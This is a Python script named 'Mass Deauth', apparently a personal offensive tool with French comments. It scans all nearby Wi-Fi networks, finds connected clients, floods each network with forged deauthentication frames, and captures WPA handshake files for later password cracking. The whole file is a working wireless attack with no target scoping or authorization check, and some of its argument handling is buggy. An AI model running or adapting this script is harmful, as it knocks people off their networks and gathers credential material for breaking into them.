#!/usr/bin/python3
from scapy.all import *
from scapy.layers import *
from prettytable import PrettyTable
import argparse
import sys
import subprocess
import shlex
import time
from threading import Timer
import string, random
"""
TODO

chopper le hash wifi

"""

# Setting the color combinations
RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"


#Set the parameters like you want
packet_sniff_timeout = 10
timeout_airodump_handshake = 20
timeout_airodump_client = 10
deauth_packets = 100





def main():
    print("""


    ███╗   ███╗ █████╗ ███████╗███████╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
    ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
    ██╔████╔██║███████║███████╗███████╗    ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
    ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
    ██║ ╚═╝ ██║██║  ██║███████║███████║    ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝

        """)
    # for the --help
    parser = argparse.ArgumentParser(description='Mass Deauth wifi script\n\n Give to the script the interface name and the monitor interface name [without this wlan0 by default]')
    args = parser.parse_args()

    #sudo verification
    if not os.geteuid() == 0:
        print(BOLD, RED,f"[!] SUDO requied, please make a sudo command")
        sys.exit()
    else:
        pass
main()


#default configuration 
if len(sys.argv) < 2:
    print(GREEN,"[+] Okay ! by default wlan0 interface !", RESET)
    interface = "wlan0"
    wlanmon = "wlan0"

#user config
if len(sys.argv) > 2:
    interface = sys.argv[0]
    wlanmon = sys.argv[1]

#Monitor mode
os.system("airmon-ng check kill  > /dev/null")
os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output
time.sleep(3)


# Wifi hotspot scan
def scan_wifi_networks():
    global bssid_list, ssid_list
    networks = []
    bssid_list = []
    ssid_list = []
    ssid_set = set()

    # Function for recieve packet
    def packet_handler(packet):
        global channel, bssid, ssid
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            channel = int(packet[Dot11Elt:3].info[0])
            if bssid not in ssid_set:
                ssid_set.add(bssid)
                networks.append((bssid, ssid, channel))
                bssid_list.append(bssid)
                ssid_list.append(ssid)
                
    # wifi sniffer command
    sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=packet_sniff_timeout)

    return networks

# Make a fucking beautifull print for Wifi Hotspot 
def display_wifi_networks(networks):
    table = PrettyTable(["Adresse MAC", "Nom du réseau", "Canal"])
    for network in networks:
        table.add_row(network)
    print(table)

networks = scan_wifi_networks()

# Start the shitty print
display_wifi_networks(networks)


#command start with timeout
def start_command(command, timeout):
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Kill process if timeout
    def kill_process(p):
        p.kill()

    # timer start for the timeout
    timer = Timer(timeout, kill_process, [process])

    try:
        # Time start + command start
        timer.start()
        output, error = process.communicate()
    finally:
        # Timer stop
        timer.cancel()

    return output.decode()



def client_grab(mac_now, channel, ssid):
    global client
    command = f"airodump-ng --bssid {mac_now} --channel {channel} {wlanmon}" # try to grab a client
    client_output = start_command(command, timeout_airodump_client)

    # Regex de mort for find a client in the output
    regex = rf'{mac_now}  ([A-F0-9:]+)'
    match = re.search(regex, client_output)
    if match:
        client = match.group(0)
        client = client.replace(f'{mac_now}','')
        print(BOLD, GREEN,f'BOOM ! For {ssid} the Client is : {client}', RESET)
    else:
        print(f"{client_output}  \n\n {regex}")
        print(RED,"[-] No clients Found ",RESET)
        print(BLUE,f'[*] Make Broadcast client MAC : "FF:FF:FF:FF:FF:FF" ')
        client = "FF:FF:FF:FF:FF:FF"
    

def handshake_grab(mac, channel, ssid):
    global handshake

    #name the output file
    letters = string.ascii_lowercase
    out_filename = ssid + ''.join(random.choice(letters) for _ in range(4))

    #hadshake capture command
    command = f"airodump-ng --bssid {mac} --channel {channel} -w {out_filename} {wlanmon}" # essaye de chopper le handshake
    output_handshake = start_command(command, timeout_airodump_handshake)

    # Another regex de mort for find if the handshake was captured
    regex = r'WPA handshake: ([A-F0-9:]+)'
    match = re.search(regex, output_handshake)
    if match:
        handshake = match.group(0)
        print(BOLD, GREEN,f'BOOM ! For {ssid} the Handshake file is : {out_filename}.cap', RESET)
    else:
        print(RED,"[-] No handshake Found",RESET)
        print(BLUE,f'[*] Result of Airodump : {output_handshake} ')



#blablabla start all blabla
if bssid_list:
    for mac, ssid in zip(bssid_list, ssid_list):
        
        #uppercase the MAC address
        mac_now = mac.upper()

        def deauth_wifi(mac, interface):
        
            #Client grab
            client_grab(mac_now, channel, ssid)

            #DeAuth client request
            packet = RadioTap()/Dot11(addr1=client, addr2=mac, addr3=mac)/Dot11Deauth()

            print(BLUE,f"\n[+] DeAuth for : {ssid} with mac : {mac}\n\n",RED)

            
            sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1),RESET# BOOM wifi deauth


            #Start handshake grabber function
            handshake_grab(mac_now, channel, ssid)

           

        deauth_wifi(mac, interface)


else:
    print(BOLD, RED,"[-] No wifi hotspot found !\n\n[*] Try again (or re-active your monitor mode) !")
    sys.exit()
    

# kill monitor mode
os.system(f"airmon-ng stop {interface} > /dev/null ")
os.system(f"ifconfig wlan0 down && iwconfig wlan0 mode manager && ifconfig wlan0 up && service networking restart && service NetworkManager restart")

